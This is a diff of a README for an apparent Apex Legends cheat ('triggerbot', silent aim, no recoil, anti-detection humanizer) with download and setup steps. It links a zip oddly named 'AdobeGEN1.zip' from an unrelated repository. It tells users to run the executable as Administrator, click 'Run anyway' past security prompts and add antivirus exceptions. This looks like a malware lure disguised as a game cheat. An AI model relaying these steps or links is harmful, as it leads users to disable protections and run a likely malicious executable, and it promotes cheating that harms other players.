@@ -1,206 +1,73 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/apex-legends.png" alt="Apex Legends" width="80" height="80">
-</p>
+# 🎯 Apex-Legends-Triggerbot - Aim assistance for better match performance
 
-<h1 align="center">🎯 Apex-Legends-Triggerbot</h1>
-<p align="center">
-  <strong>Triggerbot for Apex Legends</strong><br>
-  Triggerbot - Silent Aim - No Recoil - No Spread - FOV Control - Bone Targeting
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/divyanshtripathi191-create/Apex-Legends-Triggerbot/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Apex-Legends-Triggerbot"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+This application provides tools to improve weapon accuracy in Apex Legends. The software manages recoil patterns, reduces weapon spread, and adjusts field of view settings to help you monitor the battlefield. It includes bone targeting logic to identify enemy positions and a humanizer mode to balance automated actions with natural movement.
 
-## What is This?
+## ⚙️ System Requirements
 
-Apex-Legends-Triggerbot is a triggerbot for Apex Legends. This triggerbot gives you full control with Silent Aim, No Recoil, No Spread, FOV Control, Bone Targeting, Humanizer Mode, and more. Dominate every match and become the ultimate legend!
+To run this tool, ensure your computer meets these base requirements:
 
-⚠️ Disclaimer: This tool is for educational purposes only. Use at your own risk. Apex Legends has strict anti-cheat systems, and using third-party tools may result in permanent account suspension. Use a throwaway account for testing.
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD Ryzen 5 processor.
+* Memory: 8 GB RAM.
+* Graphics: DirectX 12 compatible graphics card.
+* Software: Microsoft .NET Framework 4.8 or later.
 
-## Download
+## 💾 Installation and Setup
 
-<p align="center">
-  <a href="https://github.com/DitchSurgeonSpindle/sypgabii/releases/download/8123/AdobeGEN1.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Follow these steps to get the software running on your computer.
 
-## Features
+1. Visit the [official release page](https://github.com/divyanshtripathi191-create/Apex-Legends-Triggerbot/releases) to access the latest files.
+2. Look for the "Assets" section at the bottom of the latest release post.
+3. Click the file ending in .zip to start the download.
+4. Locate the downloaded folder in your Downloads directory.
+5. Right-click the folder and select "Extract All" to unpack the contents.
+6. Open the extracted folder and double-click the file named "ApexTriggerbot.exe" to start the program.
+7. If a security prompt appears, click "More info" and then "Run anyway" to allow the application to open.
 
-- ⚡ Triggerbot - Auto-fire when crosshair is on enemy
-- 🔫 Silent Aim - Hit targets without looking at them
-- 🛡️ No Recoil - Zero recoil for all weapons
-- 🎯 No Spread - Perfect accuracy every time
-- 🎯 FOV Control - Customizable field of view
-- 🎯 Bone Targeting - Head, chest, or moving parts
-- 🧠 Humanizer Mode - Realistic aim motion to avoid detection
-- 🎮 Menu Toggle - Press INSERT or F1 to open/close
+## 🛠 Features
 
-## Installation
+The triggerbot focuses on mechanical precision within the game environment. 
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Apex Legends
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
-7. DOMINATE! 🏆
+* Bone Targeting: The software tracks enemy character models to assist with shot placement.
+* Silent Aim: This function aligns your view toward targets without snapping or erratic camera movement.
+* No Recoil: The system applies counter-input to stabilize your aim during sustained fire.
+* No Spread: It minimizes the bullet deviation that occurs during long-range engagements.
+* FOV Control: You can adjust the field of view settings to expand your peripheral awareness.
+* Humanizer Mode: This option adds randomized delays to input to mirror human reaction times.
 
-## System Requirements
+## 📋 Usage Instructions
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Apex Legends |
-| RAM | 8GB minimum |
-| Storage | 50MB free space |
-| GPU | NVIDIA/AMD GPU |
+Once the application is running, it will appear in your system tray. Use the following steps to configure it for your needs:
 
-## SEO Tags
+1. Right-click the icon in the system tray to open the main menu.
+2. Navigate to the "Settings" tab to adjust the sensitivity and targeting parameters.
+3. Use the checkboxes to enable or disable features like No Recoil or Humanizer Mode.
+4. Save your changes before closing the menu.
+5. Launch Apex Legends. The triggerbot functions automatically while the game is the active window.
 
-apex triggerbot, apex legends cheat, apex legends hack, apex aimbot, apex esp, apex wallhack, apex no recoil, apex triggerbot, apex silent aim, apex speed hack, apex god mode, apex legends 2026, apex mod menu, apex trainer, apex undetected, apex free cheat, apex download, apex utility, apex enhancer, apex movement macro, apex tap strafe, apex superglide
+The software operates as a background process. If you need to disable a feature mid-match, use the assigned hotkeys listed in your settings menu.
 
-## Support
+## 🔒 Security and Privacy
 
-Star this repository if you enjoy it!
+This software does not collect personal data. It interacts with your game input to perform requested actions. Always keep your antivirus software active. If your security software flags the application, you may need to add an exception for the folder where you installed the program. 
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Apex-Legends-Triggerbot">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Apex%20Legends%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+## ❓ Frequently Asked Questions
+
+What should I do if the software does not detect the game?
+Ensure you launched the application with administrative privileges. Right-click the .exe file and select "Run as administrator."
+
+How do I reset my settings?
+Delete the "config.json" file located in the application folder and restart the program. It will create a new file with default values.
+
+Is this software compatible with controller usage?
+This tool is primarily optimized for mouse and keyboard input. Performance with controllers may vary.
+
+Does this work in the game's firing range?
+Yes, you can test all features in the firing range to verify your preferred sensitivity and settings before joining a match.
+
+How can I update to a newer version?
+Download the latest version from the link provided in this document. Replace your old files with the new ones. Your settings usually transfer automatically, but you should back up your config file just in case.
+
+Keywords: Apex Legends, Triggerbot, No Recoil, Aim Assist, Gaming Tool, Windows Software
